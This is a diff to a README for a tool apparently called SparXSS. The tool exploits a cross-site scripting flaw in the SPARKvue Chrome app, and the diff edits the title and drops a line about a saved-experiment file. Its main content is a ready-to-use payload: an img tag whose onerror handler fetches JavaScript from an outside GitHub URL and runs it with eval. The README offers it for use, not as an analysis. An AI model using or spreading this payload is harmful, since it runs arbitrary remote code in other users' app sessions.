@@ -1,11 +1,9 @@
-## A Script For Redirection And Custom Javascript Execution For The SPARKvue XSS Vulnerability Found By ohonbob
+## A Script For Redirection And Custom Javascript Execution For The SPARKvue Chrome App XSS Vulnerability Found By ohonbob
 
 Run it using:
 ```
 <img src=# onerror='fetch("https://raw.githubusercontent.com/Amukerd/SparXSS/main/sparxss.js").then(r=>r.text()).then(c=>eval(c))'>
 ```
-
-Or Download The SparXSS.spklab File And Select 'Open Saved Experiment' When You Open The App - Might not always be up to date
 
 ## [Changelog](https://github.com/Amukerd/SparXSS/blob/main/Changelog.md)
 
